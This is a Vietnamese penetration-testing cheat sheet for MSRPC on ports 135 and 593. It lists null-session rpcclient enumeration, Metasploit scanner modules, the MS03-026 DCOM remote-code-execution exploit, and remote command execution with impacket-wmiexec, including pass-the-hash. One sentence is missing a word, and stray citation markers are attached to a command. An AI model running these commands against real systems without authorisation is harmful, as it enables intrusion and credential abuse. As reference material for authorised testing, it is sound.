# RPC (Port 135, 593)

## Connect

### Netcat

Kiểm tra kết nối tới các cổng MSRPC (thường là 135 và 593) bằng Netcat:

```
nc -vn <ip> 135
nc -vn <ip> 593
```

***

## Enumeration

### Sử dụng RPC Client

Sử dụng công cụ RPC client của Windows để liệt kê thông tin MSRPC với tài khoản rỗng:

```
rpcclient -U "" -N <ip>
```

Sau khi kết nối, chạy các lệnh:

```
serverinfo
lsaenumsid
netshareenumall
enumdomusers
querydispinfo
enumdomgroups
enumdomains
```

### Xác định dịch vụ RPC được expose

Sử dụng rpcdump để liệt kê các dịch vụ RPC độc đáo (IFID) và chi tiết liên kết giao tiếp:

```
rpcdump [-p port] <ip>
```

### Kiểm tra bằng Metasploit

Sử dụng các module Metasploit để kiểm tra và tương tác với dịch vụ MSRPC trên cổng 135:

```
msf> use auxiliary/scanner/dcerpc/endpoint_mapper
msf> use auxiliary/scanner/dcerpc/hidden
msf> use auxiliary/scanner/dcerpc/management
msf> use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
```

***

## Attack Vectors

### Đăng nhập ẩn danh

Kết nối tới MSRPC mà không cần thông tin đăng nhập để truy cập các dịch vụ công khai:

```
rpcclient -U "" -N <ip>
```

Sau khi kết nối, liệt kê thông tin nhạy cảm như người dùng, nhóm, hoặc chia sẻ:

```
enumdomusers
netshareenumall
enumdomains
```

### Khai thác giao diện MSRPC

Tận dụng các giao diện MSRPC để truy cập trái phép, thực thi lệnh từ xa, hoặc chỉnh sửa hệ thống:

```
LSA interface (pipe\lsarpc)
LSA Directory Services (DS) interface (pipe\lsarpc)
LSA SAMR interface (pipe\samr)
Server services and Service control manager interface (pipe\svcctl, pipe\srvsvc)
Remote registry service (pipe\winreg)
Task scheduler (pipe\atsvc)
DCOM interface (pipe\epmapper)
IOXIDResolver interface
```

#### Khai thác MSRPC DCOM cho RCE

Tận dụng MSRPC DCOM để thực thi mã tùy ý trên máy từ xa:

```
# Sử dụng Metasploit để khai thác DCOM
msf> use exploit/windows/dcerpc/ms03_026_dcom
   > set RHOSTS <ip>
   > set RPORT 135
   > run
```

***

## Post-Exploitation

### Thực thi lệnh từ xa&#x20;

Sử dụng wmiexec để  trên hệ thống mục tiêu:

```
impacket-wmiexec domain/user:password@192.168.1.100 "hostname"
```

Ta cũng có thể sử dụng NTLM hash để xác thực:

```
impacket-wmiexec -hashes LMHASH:NTHASH domain/user@target_ip "ipconfig /all"[4][2]
```